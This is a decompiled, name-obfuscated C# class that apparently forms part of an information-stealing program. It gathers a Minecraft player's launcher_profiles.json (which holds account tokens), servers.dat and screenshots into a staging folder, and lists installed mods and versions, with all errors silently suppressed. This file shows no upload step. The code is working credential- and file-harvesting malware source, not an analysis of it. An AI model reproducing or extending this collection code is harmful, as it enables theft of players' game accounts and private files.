using System.IO;
using ns13;
using ns14;

namespace ns7;

internal sealed class Class27
{
	private static string string_0 = Path.Combine(Class55.string_3, ".minecraft");

	private static void smethod_0(string string_1)
	{
		string[] directories = Directory.GetDirectories(Path.Combine(string_0, "versions"));
		foreach (string path in directories)
		{
			string name = new DirectoryInfo(path).Name;
			string text = Class62.smethod_2(path) + " bytes";
			string text2 = Directory.GetCreationTime(path).ToString("yyyy-MM-dd h:mm:ss tt");
			File.AppendAllText(string_1 + "\\versions.txt", "VERSION: " + name + "\n\tSIZE: " + text + "\n\tDATE: " + text2 + "\n\n");
		}
	}

	private static void smethod_1(string string_1)
	{
		string[] files = Directory.GetFiles(Path.Combine(string_0, "mods"));
		foreach (string obj in files)
		{
			string fileName = Path.GetFileName(obj);
			string text = new FileInfo(obj).Length + " bytes";
			string text2 = File.GetCreationTime(obj).ToString("yyyy-MM-dd h:mm:ss tt");
			File.AppendAllText(string_1 + "\\mods.txt", "MOD: " + fileName + "\n\tSIZE: " + text + "\n\tDATE: " + text2 + "\n\n");
		}
	}

	private static void smethod_2(string string_1)
	{
		string[] files = Directory.GetFiles(Path.Combine(string_0, "screenshots"));
		if (files.Length != 0)
		{
			Directory.CreateDirectory(string_1 + "\\screenshots");
			string[] array = files;
			foreach (string text in array)
			{
				File.Copy(text, string_1 + "\\screenshots\\" + Path.GetFileName(text));
			}
		}
	}

	private static void smethod_3(string string_1)
	{
		string text = Path.Combine(string_0, "servers.dat");
		if (File.Exists(text))
		{
			File.Copy(text, string_1 + "\\servers.dat");
		}
	}

	private static void smethod_4(string string_1)
	{
		string text = Path.Combine(string_0, "launcher_profiles.json");
		if (File.Exists(text))
		{
			File.Copy(text, string_1 + "\\launcher_profiles.json");
		}
	}

	public static void smethod_5(string string_1)
	{
		if (!Directory.Exists(string_0))
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(string_1);
			smethod_4(string_1);
			smethod_3(string_1);
			smethod_2(string_1);
			smethod_1(string_1);
			smethod_0(string_1);
		}
		catch
		{
		}
	}
}
